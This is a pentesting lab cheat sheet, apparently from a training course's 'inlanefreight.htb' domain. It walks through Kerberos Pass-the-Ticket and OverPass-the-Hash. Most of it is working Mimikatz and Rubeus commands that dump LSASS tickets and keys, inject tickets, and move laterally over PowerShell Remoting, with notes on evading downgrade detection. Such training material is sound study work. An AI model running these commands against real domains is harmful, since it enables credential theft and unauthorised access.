> Stolen Kerberos ticket is used instead of NTLM hash to authenticate

## Export the tickets
### mimikatz

**Administrator**
```ps1
mimikatz.exe privilege::debug 'sekurlsa::tickets /export' exit
```

To gather all the kerberos tickets present. The output will be in a list of files with `.kirbi` extentsion containing the tickets
 > The tickets that end in `$` correspond to a computer account. User tickets will end with just `@`

| `[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi` | User Ticket |
| --- | --- |
| `[0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi` | **Computer Account** |

> ***Note***: Ticket with service krbtgt is the ticket granting ticket for the account

> ***Caution***: Mimikatz ver2.2.0 20220919 if command `sekurlsa::ekeys` it sometimes shows all hashes as des_cbc_md4 on windows 10. Thus Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. Use Rubeus in to generate tickets in base64 format.

### Rubeus

```ps1
Rubeus.exe dump /nowrap
```

This will dump the tickets in base64 format in the terminal and will not provide a file, `/nowrap` makes it easier to copy

## Pass the Key or OverPass the Hash

### Requirements

User's hash. Use `sekurlsa::ekeys` to dump all kerberos encryption keys.
- `AES256_HMAC` and `RC4_HMAC` keys are needed

> **Note**: For this attack type mimikatz require admin rights as it creates a LSASS process whereas rubeus does not. Rubeus can also be caught as Kerberos can only use port 88 to interact with services, but it is less likely because of the popularity of the attack from mimikatz

> pth vs asktgt <https://github.com/GhostPack/Rubeus#example-over-pass-the-hash>

### Mimikatz

```ps1
mimikatz.exe privilege::debug 'sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:<rc4_hash>'
```

this will create a cmd.exe shell and can be used to run any service of choice from there

### Rubeus

```ps1
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<aes256_hash> /nowrap
```

>***Note*** For both the tools the encryption type can be changed.

> ***Note***: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade." 

## Pass-the-Ticket

### Rubeus

#### Import Ticket from .kirbi file

```ps1
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

#### Convert ticket to base64 then pth

```ps1
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Converts the ticket to base64

```ps1
Rubeus.exe ptt /ticket:<base64_ticket_string>
```

Uses the base64 ticket string to perform the attack

#### Genererate the ticket and submit it

```ps1
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt 
```
Performs a OverPass the hash attack and `/ptt` submits the ticket(TGT or TGS) to the logon session

### Mimikatz

```ps1
mimikatz.exe privilege::debug 'kerberos::ptt "<kirbi_file_path>"
```
> **Note**: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.

## Pass-the_ticket with Powershell Remoting

### Requirements
To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

Powershell Remoting creates the following listeners

| Ports | Protocol |
|---|---|
| `TCP/5985` | HTTP |
| `TCP/5986` | HTTPS |

#### Mimikatz
After ptt using mimikatz use `Enter-PSSession -ComputerName hostname`

#### Rubeus
**Create Sacrificial Program**
```ps1
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
Creates a cmd session using [type-9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/) logon session
Execute Rubeus from that session to request for TGT for lateral movement
```ps1
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```